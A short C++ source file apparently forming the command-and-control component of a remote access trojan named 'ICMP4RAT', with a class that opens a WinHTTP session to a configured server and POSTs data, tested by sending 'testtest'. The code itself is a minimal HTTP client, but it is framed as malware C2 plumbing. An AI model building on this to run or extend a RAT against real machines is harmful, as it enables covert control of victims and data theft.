#include <iostream>
#include "cncManager.h"

cncManager::cncManager() {
	this->hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

	if (this->hSession)
		this->hConnect = WinHttpConnect(this->hSession, this->server, INTERNET_DEFAULT_HTTP_PORT, 0);
}

void cncManager::sendHttpRequest(LPCWSTR data, DWORD dlen) {
	if (this->hConnect)
		this->hRequest = WinHttpOpenRequest(this->hConnect, L"POST", this->index, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

	/* WINHTTP_NO_REQUEST_DATA == NULL*/
	/*if (this->hRequest)
		this->bResults = WinHttpSendRequest(this->hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);*/
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)data, dlen, dlen, 0);

	if (this->bResults)
		this->bResults = WinHttpReceiveResponse(this->hRequest, NULL);

	if (!this->bResults)
		std::cout << "Error" << GetLastError() << "has occurred." << std::endl;
}

cncManager::~cncManager() {
	/* Delete Http Handle*/
	if (this->hRequest) WinHttpCloseHandle(this->hRequest);
	if (this->hConnect) WinHttpCloseHandle(this->hConnect);
	if (this->hSession) WinHttpCloseHandle(this->hSession);
}

int main() {
	cncManager client;
	client.sendHttpRequest(L"testtest", 8);
	
}
